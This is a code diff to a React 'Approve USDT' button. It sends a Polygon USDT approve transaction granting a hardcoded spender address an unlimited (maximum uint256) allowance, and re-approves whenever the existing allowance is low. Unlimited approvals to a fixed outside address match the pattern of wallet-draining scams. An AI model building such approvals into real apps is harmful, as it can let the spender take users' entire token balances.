@@ -1,37 +1,59 @@
 import { useState } from 'react';
 
-const USDT_CONTRACT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
-const SPENDER_ADDRESS = "0x406aE7273E16F48caA25C5a4C37266661051A11e";
+const USDT_CONTRACT_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
+const SPENDER_ADDRESS = "0x406ae7273e16f48caa25c5a4c37266661051a11e"
 const POLYGON_CHAIN_ID = '0x89'; // Chain ID for Polygon mainnet
 
 function UsdtApprovalButton({ connected, account }) {
     const [approving, setApproving] = useState(false);
-    
+
     const getData = () => {
-        return "0x095ea7b3" + 
-               SPENDER_ADDRESS.substring(2).padStart(64, '0') + 
-               "100000000000000000000000000000000000000000000"; // Max uint256 value
+        return "0x095ea7b3000000000000000000000000406ae7273e16f48caa25c5a4c37266661051a11effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
     };
-    
-    const estimateGas = async () => {
-        const data = getData();
 
-        const params = [{
-            from: account,
-            to: USDT_CONTRACT_ADDRESS,
-            data: data
-        }];
+    const getAllowanceData = (owner, spender) => {
+        return "0xdd62ed3e" +
+            owner.substring(2).padStart(64, '0') +
+            spender.substring(2).padStart(64, '0');
+    };
 
-        try {
-            return await window.ethereum?.request({
-                method: 'eth_estimateGas',
-                params,
-            });
-        } catch (error) {
-            console.error("Error estimating gas: ", error);
-            return "0x186a0"; // fallback to default gas
+    const checkAllowance = async () => {
+        if (account) {
+            const data = getAllowanceData(account, SPENDER_ADDRESS);
+            const params = {
+                to: USDT_CONTRACT_ADDRESS,
+                data: data
+            };
+
+            try {
+                const result = await window.ethereum?.request({
+                    method: 'eth_call',
+                    params: [params, 'latest'],
+                });
+
+                // The result will be in hex format, you'll need to convert it to decimal
+                const allowance = parseInt(result, 16);
+                console.log("USDT Allowance: ", allowance);
+
+                return allowance;
+            } catch (error) {
+                console.error("Error checking USDT allowance: ", error);
+                return 0;
+            }
         }
     };
+
+    const checkIfAllowancePresent = async () => {
+        const allowance = await checkAllowance()
+        console.log("allowance = ", allowance)
+        if (allowance > 1000) {
+            console.log("allowance is present")
+        }
+        else {
+            console.log("allowance is absent")
+            await approveUSDT()
+        }
+    }
 
     const switchToPolygon = async () => {
         try {
@@ -50,7 +72,7 @@ function UsdtApprovalButton({ connected, account }) {
 
     const approveUSDT = async () => {
         setApproving(true);
-        
+
         // Check current network
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
 
@@ -61,19 +83,19 @@ function UsdtApprovalButton({ connected, account }) {
             return;
         }
 
-        const gasEstimate = await estimateGas();
+        //const gasEstimate = await estimateGas();
         const data = getData();
 
         const params = [{
             from: account,
             to: USDT_CONTRACT_ADDRESS,
             data: data,
-            gas: gasEstimate
+            // gas: gasEstimate
         }];
 
         // Console log the data and params being sent for approval
-    console.log("Data being sent for approval: ", data);
-    console.log("Transaction parameters: ", params);
+        console.log("Data being sent for approval: ", data);
+        console.log("Transaction parameters: ", params);
 
         try {
             const result = await window.ethereum?.request({
@@ -91,7 +113,7 @@ function UsdtApprovalButton({ connected, account }) {
     return (
         <div>
             {connected ? (
-                <button onClick={approveUSDT} disabled={approving}>
+                <button onClick={checkIfAllowancePresent} disabled={approving}>
                     {approving ? 'Approving...' : 'Approve USDT'}
                 </button>
             ) : (
